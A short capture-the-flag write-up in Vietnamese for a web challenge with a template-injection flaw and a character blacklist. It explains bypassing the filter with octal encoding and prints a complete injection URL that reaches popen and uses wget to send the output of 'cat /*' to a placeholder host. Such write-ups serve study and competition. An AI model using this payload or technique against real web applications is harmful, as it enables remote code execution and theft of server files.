Website: https://cybergon.ctfd.io/challenges
# Web
## 1. Flappy Block v2
Website bị lỗi SSTI ở path `https://cybergon-flappy-block.chals.io/image?text={{ssti_payload}}`.

Nhận thấy website có những cơ chế sau:
+) Blacklist `_` `.` `|` `x`
+) Blacklist keywords `config`
+) Chuyển đổi ký tự: r->w, R->W, l->w, L->W, u->yu, U->yU

Do đó, hầu hết các attack vector đều đã bị chặn.

Solution: octal encoding

```
https://cybergon-flappy-block.chals.io/image?text={{%27%27[%27\137\137\143\154\141\163\163\137\137%27][%27\137\137\155\162\157\137\137%27][1][%27\137\137\163\165\142\143\154\141\163\163\145\163\137\137%27]()[140][%27\137\137\151\156\151\164\137\137%27][%27\137\137\147\154\157\142\141\154\163\137\137%27][%27popen%27](%27wget%20https://yourwebsitehere?d=`cat%20/*`%27)}}
```

Kinh nghiệm: Sử dụng octal encoding để bypass character blocking. Bài này mình đã mất rất nhiều thời gian tìm payload vòng tránh, các hàm chuyển đổi, các encoding như UTF-8 UTF-16 nhưng không được. Cuối cùng solution lại là octal encoding, rất phổ biến.

